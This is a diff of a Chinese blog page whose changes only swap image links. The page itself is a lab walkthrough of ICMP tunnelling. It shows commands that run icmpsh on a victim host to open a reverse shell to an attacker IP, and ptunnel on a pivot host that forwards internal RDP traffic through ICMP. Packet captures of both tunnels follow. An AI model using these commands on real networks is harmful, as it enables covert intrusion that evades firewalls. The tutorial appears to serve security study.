@@ -437,7 +437,7 @@
 <p>py使用前需安装Impacket依赖库</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">sudo python setup.py  install</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220115174615662.png"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115174615662.png" alt="image-20220115174615662"></p>
 <p>开启前需要先关闭攻击机的icmp应答，防止内核对自己的ping包响应</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
 
@@ -445,15 +445,15 @@
 <h4 id="①将exe执行文件上传到受害机-并执行"><a href="#①将exe执行文件上传到受害机-并执行" class="headerlink" title="①将exe执行文件上传到受害机 ,并执行"></a>①将exe执行文件上传到受害机 ,并执行</h4><p>执行代码如下:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机IP地址</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220115180444442.png" alt="image-20220115180444442"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115180444442.png" alt="image-20220115180444442"></p>
 <h4 id="②攻击机进行监听"><a href="#②攻击机进行监听" class="headerlink" title="②攻击机进行监听"></a>②攻击机进行监听</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 攻击者IP 受害者IP</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220115181302164.png" alt="image-20220115181302164"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115181302164.png" alt="image-20220115181302164"></p>
 <h4 id="③抓包分析"><a href="#③抓包分析" class="headerlink" title="③抓包分析"></a>③抓包分析</h4><p>通过抓取该网卡可以观察到都是ICMP报文的数据包</p>
-<p><img src="/.io//image-20220115181352895.png" alt="image-20220115181352895"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115181352895.png" alt="image-20220115181352895"></p>
 <p>在反弹的shell执行whoami并在数据包中查看数据信息</p>
-<p><img src="/.io//image-20220115181617573.png" alt="image-20220115181617573"></p>
-<p><img src="/.io//image-20220115181651000.png" alt="image-20220115181651000"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115181617573.png" alt="image-20220115181617573"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115181651000.png" alt="image-20220115181651000"></p>
 <p>最后, 通过报文分析可以知道ICMP隧道是将执行的代码封装在了ICMP报文中的数据中</p>
 <h3 id="2-ptunnel-使用"><a href="#2-ptunnel-使用" class="headerlink" title="2.ptunnel 使用"></a>2.ptunnel 使用</h3><p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/f1vefour/ptunnel">https://github.com/f1vefour/ptunnel</a> 需自行编译</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptunnel参数含义:</span><br><span class="line">-p ##表示连接 icmp 隧道另一端的机器 IP（即目标服务器） </span><br><span class="line">-lp ##表示需要监听的本地 tcp 端口 </span><br><span class="line">-da ##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP） </span><br><span class="line">-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口） </span><br><span class="line">-x ##设置连接的密码 </span><br></pre></td></tr></table></figure>
@@ -461,26 +461,26 @@
 <p>进入解压后文件输入如下即可:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220115184059494.png" alt="image-20220115184059494"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220115184059494.png" alt="image-20220115184059494"></p>
 <p>开启前需要先关闭攻击机的icmp应答，防止内核对自己的ping包响应</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
 
 <p>环境模拟:</p>
-<p><img src="/.io//image-20220118154747348.png" alt="image-20220118154747348"></p>
-<h4 id="①将编译好的ptunnel上传到跳板机"><a href="#①将编译好的ptunnel上传到跳板机" class="headerlink" title="①将编译好的ptunnel上传到跳板机"></a>①将编译好的ptunnel上传到跳板机</h4><p><img src="/.io//image-20220116174149737.png" alt="image-20220116174149737"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118154747348.png" alt="image-20220118154747348"></p>
+<h4 id="①将编译好的ptunnel上传到跳板机"><a href="#①将编译好的ptunnel上传到跳板机" class="headerlink" title="①将编译好的ptunnel上传到跳板机"></a>①将编译好的ptunnel上传到跳板机</h4><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220116174149737.png" alt="image-20220116174149737"></p>
 <p>并赋予可执行权限</p>
 <h4 id="②设置连接密码"><a href="#②设置连接密码" class="headerlink" title="②设置连接密码"></a>②设置连接密码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ptunnel -x mrfan</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220118155008439.png" alt="image-20220118155008439"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118155008439.png" alt="image-20220118155008439"></p>
 <h4 id="③攻击机将转发的-3389请求数据给本地-6666"><a href="#③攻击机将转发的-3389请求数据给本地-6666" class="headerlink" title="③攻击机将转发的 3389请求数据给本地 6666"></a>③攻击机将转发的 3389请求数据给本地 6666</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./ptunnel -p 192.168.1.14 -lp 6666 -da 192.168.22.14 -dp 3389 -x mrfan</span><br><span class="line"></span><br><span class="line">-p ##表示连接 icmp 隧道另一端的机器 IP（即目标服务器） </span><br><span class="line">-lp ##表示需要监听的本地 tcp 端口 </span><br><span class="line">-da ##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP） </span><br><span class="line">-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口） </span><br><span class="line">-x ##连接的密码 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220118155501184.png" alt="image-20220118155501184"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118155501184.png" alt="image-20220118155501184"></p>
 <h4 id="③利用连接好的跳板机去连接受害机"><a href="#③利用连接好的跳板机去连接受害机" class="headerlink" title="③利用连接好的跳板机去连接受害机"></a>③利用连接好的跳板机去连接受害机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220118155720495.png" alt="image-20220118155720495"></p>
-<p><img src="/.io//image-20220118160238485.png" alt="image-20220118160238485"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118155720495.png" alt="image-20220118155720495"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118160238485.png" alt="image-20220118160238485"></p>
 <h4 id="④抓包分析"><a href="#④抓包分析" class="headerlink" title="④抓包分析"></a>④抓包分析</h4><p>通过在192.168.1.0/24网卡上进行抓包</p>
-<p><img src="/.io//image-20220118160336840.png" alt="image-20220118160336840"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220118160336840.png" alt="image-20220118160336840"></p>
 <p>可以抓到许多ICMP的数据包, 并是由192.168.1.11(攻击机)与192.168.1.14(跳板机)的请求应答包, 所以这也是通过ICMP的数据部分进行了相应的伪装所达成的一种伪装</p>
 
           
